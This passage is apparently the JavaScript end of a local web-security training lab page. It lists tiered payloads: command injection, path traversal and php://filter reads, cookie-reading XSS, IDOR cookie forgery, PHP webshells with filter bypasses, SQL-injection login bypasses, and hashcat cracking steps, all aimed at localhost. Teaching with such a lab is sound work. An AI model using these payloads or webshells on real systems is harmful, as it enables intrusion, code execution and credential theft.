  hard:{p:"127.0.0.1$(cat${IFS}private/cmdi_flag.sha256)", n:"Hard — ; & | ` + spaces stripped → $(...) with ${IFS}. The flag is an UNSALTED SHA-256 (it leaks in the ping error); hashid → hashcat -m 1400 rockyou → butterfly."},
  expert:{p:"127.0.0.1; cat private/cmdi_flag.salted > uploads/pwn.txt", n:"Expert — BLIND (no output). Exfiltrate: write the file to /uploads/pwn.txt, open it → a SALTED md5 (hash:salt) → hashcat -m 10 rockyou → welcome."}
 },
 pg:{
  easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal. Goal: read a file OUTSIDE the web root (the secret flag)."},
  medium:{p:"....//....//....//....//....//....//....//etc/passwd", n:"Medium — '../' stripped once → ....//. Goal: climb to / and read a system file (/etc/passwd = the user list)."},
  hard:{p:"php://filter/convert.base64-encode/resource=db.php", n:"Hard — '../' stripped recursively (....// dies) → php://filter wrapper. Goal: SOURCE DISCLOSURE — base64-decode a .php file to read its source. How you'd know db.php exists: first filter-read a page you KNOW is there (e.g. home.php) — its require/include lines name the other files (db.php, levels.php…). Or fuzz common names (db.php/config.php)."},
  expert:{p:"php://filter/read=string.rot13/resource=../lfi_secret/flag.txt", n:"Expert — + 'base64' blocked → string.rot13 filter. Goal: still exfiltrate the flag; rot13 the output back."}
 }
};
PAYLOADS.q.easy.x='"><script>alert(1)<\/script>';
PAYLOADS.q.medium.x='"><img src=x onerror=alert(1)>';
PAYLOADS.q.hard.x='"><svg onload=alert(1)>';
PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — the app trusts a uid cookie)",n:"Expert — the ?id is ignored; the app trusts a 'uid' cookie. Easiest: click 'become uid=1 (admin) ▶' below (sets a uid cookie scoped to /profile.php, so only this exercise is touched). Manual/classic way: DevTools → Application → Cookies → add uid=1, then Run. Both work."}};
PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no content checks."},medium:{p:"<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Medium — 'system' blocked in content -> passthru()."},hard:{p:"<\x3Fphp echo `$_GET[cmd]`; ?\x3E",n:"Hard — exec-family blocked -> backticks."},expert:{p:"<\x3Fphp $f='sy'.'stem'; $f($_GET['cmd']); ?\x3E",n:"Expert — backticks blocked -> split the name (sy.stem -> system)."}};
// Per-level webshell objective: a DIFFERENT real post-exploitation use case at each level.
PAYLOADS.upcmd={easy:{cmd:"cat ../private/upload_flag.txt",why:"read the flag — PLAINTEXT"},medium:{cmd:"cat ../private/upload_flag.b64",why:"flag is BASE64 — pipe the output to `base64 -d`"},hard:{cmd:"cat ../private/upload_flag.md5",why:"flag is an UNSALTED md5 — hashid then hashcat -m 0 rockyou (-> sunshine)"},expert:{cmd:"cat ../private/upload_flag.sha256salt",why:"flag is a SALTED sha256 (hash:salt) — hashcat -m 1410 rockyou (-> pokemon)"}};
var _ready=false;
function setLvl(card,lvl){
  var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
  var d=PAYLOADS[card][lvl];
  if(card==='up'){ document.getElementById('up_code').value=d.p;
    var uc=PAYLOADS.upcmd[lvl];
    var plu=document.getElementById('pl_up'); if(plu) plu.textContent=uc.cmd;
    var cap=document.getElementById('cap_up'); if(cap) cap.textContent='goal: '+uc.why;
    // step-2 command is NOT auto-filled — use the "use this ▶" button under the suggested command
  }
  else { var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p; }
  var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
  var plx=document.getElementById('pl_'+card+'x'); if(plx && d.x) plx.textContent=d.x;
  if(card==='cmd'){ var s2=document.getElementById('cmd_step2'); if(s2) s2.style.display=(lvl==='expert')?'block':'none'; }
  if(card==='id'){ var ie=document.getElementById('id_expert'); if(ie) ie.style.display=(lvl==='expert')?'block':'none'; }
  // no auto-fill on level change: the payload enters the input only via "use this ▶" (explicit ask);
  // collapse the hint AND clear the input(s) on each switch so the previous level's answer doesn't linger.
  var _pl=document.getElementById('pl_'+card); if(_pl){ var _det=_pl.closest('details'); if(_det) _det.open=false; }
  var _in=document.getElementById('in_'+card); if(_in){ _in.value=''; _in.dispatchEvent(new Event('input')); }
  if(card==='login'){ var _lp=document.getElementById('in_lp'); if(_lp)_lp.value=''; var _lu=document.getElementById('in_lu'); if(_lu){ _lu.value=''; _lu.dispatchEvent(new Event('input')); } }
  // also blank the result frame(s) so last level's output (incl. its echoed search box) doesn't linger
  ['r_'+card,'r_'+card+'c'].forEach(function(id){ var f=document.getElementById(id); if(f){ f.style.display='none'; try{f.src='about:blank';}catch(e){} } });
  document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
}
PAYLOADS.login={easy:{p:"admin'-- -",n:"Easy — comment out the password check."},medium:{p:"admin' or '1'='1",n:"Medium — comments stripped -> self-closing OR (no comment)."},hard:{p:"admin' oorr '1'='1",n:"Hard — 'or' also stripped -> nest it (oorr -> or)."},expert:{p:"admin'/**/oorr/**/'1'='1",n:"Expert — spaces also stripped -> /**/ as spaces."}};
PAYLOADS.disc={
 easy:{p:"curl -s http://localhost:8000/config.php.bak      # or open it + View Source (Ctrl+U)",n:"Easy — a config BACKUP (.bak) left in the web root (robots.txt lists it). Holds the admin password in PLAINTEXT + FLAG{c0nfig_backup_left_in_webroot}."},
 medium:{p:"curl -s http://localhost:8000/private/creds_medium.b64 | base64 -d",n:"Medium — /private/ has no directory listing; the deployment notes name the files. creds_medium.b64 holds the login BASE64-encoded — decode it → admin:Sup3rStaging!99."},
 hard:{p:"curl -s http://localhost:8000/private/creds_hard.txt        # admin:<sha1>\nhashid '<sha1>'   # SHA-1 ->\nhashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt",n:"Hard — creds_hard.txt leaks an UNSALTED SHA-1. Identify it (hashid), crack with rockyou → chocolate."},
 expert:{p:"curl -s http://localhost:8000/private/creds_expert.txt     # admin:<md5>:<salt>\nhashcat -m 10 hash.txt /usr/share/wordlists/rockyou.txt    # feed one 'hash:salt' line",n:"Expert — creds_expert.txt stores the password SALTED (md5(pass+salt), hash:salt). Crack with the matching mode -m 10 → liverpool."}
};
['q','cmd','pg','gb','id','up','login','disc'].forEach(function(c){ setLvl(c,'easy'); });
_ready=true;
/* quick-pick: descriptive one-click shortcuts under each card (select the level + fill the input; reuses setLvl) */
var QLV=['easy','medium','hard','expert'];
var QLABELS={q:['fingerprint','tables','dump','blind'],cmd:['plaintext','base64','sha256','salted'],pg:['secret','/etc/passwd','source','flag'],gb:['<script>','<img>','<svg>','<animate>'],id:['raw id','base64','md5','cookie'],up:['system','passthru','backtick','split-name'],login:['comment','OR','nested OR','/**/'],disc:['plaintext .bak','base64','unsalted hash','salted hash']};
Object.keys(QLABELS).forEach(function(card){
  var lvd=document.getElementById('lv_'+card); if(!lvd) return;
  var row=document.createElement('div'); row.style.cssText='margin:4px 0 2px';
  var tag=document.createElement('span'); tag.className='muted'; tag.style.fontSize='.82em'; tag.textContent='quick pick: '; row.appendChild(tag);
  QLABELS[card].forEach(function(lab,i){
    var b=document.createElement('button'); b.type='button'; b.className='ghost';
    b.style.cssText='font-size:.82em;padding:2px 7px;margin:1px'; b.textContent=lab;
    b.addEventListener('click',(function(lv){return function(){setLvl(card,lv);};})(QLV[i]));
    row.appendChild(b);
  });
  lvd.parentNode.insertBefore(row, lvd.nextSibling);
});
// Accordion: collapse every challenge card; click a title to open it (closes the others).
document.querySelectorAll('.wrap > .card').forEach(function(card){
  var h=card.querySelector('h2'); if(!h) return;
  if(!card.querySelector('form, .levels, textarea')) return;   // skip the intro card
  card.classList.add('chal');
  var body=document.createElement('div'); body.className='cbody';
  while(h.nextSibling){ body.appendChild(h.nextSibling); }
  card.appendChild(body);
  h.addEventListener('click',function(){
    var open=card.classList.contains('open');
    document.querySelectorAll('.card.chal.open').forEach(function(c){ c.classList.remove('open'); });
    if(!open) card.classList.add('open');
  });
});
var first=document.querySelector('.card.chal'); if(first) first.classList.add('open');  // open the first
// Live URL preview under each GET form input (shows WHERE the payload goes).
document.querySelectorAll('form').forEach(function(f){
  var named=[]; f.querySelectorAll('input[type="text"],textarea').forEach(function(i){ if(i.name) named.push(i); });
  if(!named.length) return;
  var method=(f.getAttribute('method')||'get').toUpperCase();
  var act=(f.getAttribute('action')||'').split('?')[0]||'(this page)';
  var pv=document.createElement('div'); pv.className='urlprev'; f.appendChild(pv);
  function upd(){ var qs=named.map(function(i){return i.name+'='+i.value;}).join('&');
    pv.textContent=(method==='GET')?('→ GET '+act+'?'+qs):('→ POST '+act+'   body: '+qs); }
  named.forEach(function(i){ i.addEventListener('input',upd); }); upd();
});
function doUpload(){
  var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
  var lvl=(document.getElementById('lvl_up')||{}).value||'easy';
  var name=document.getElementById('up_name').value||'shell.php';
  var fd=new FormData(); fd.append('file', new Blob([document.getElementById('up_code').value],{type:'image/gif'}), name);
  fetch('upload.php?level='+lvl+'&embed=1',{method:'POST',body:fd}).then(r=>r.text()).then(t=>out.textContent=t.replace(/<[^>]*>/g,' ').replace(/\s+/g,' ').trim()).catch(e=>out.textContent='error: '+e);
}
</script>
</body></html>
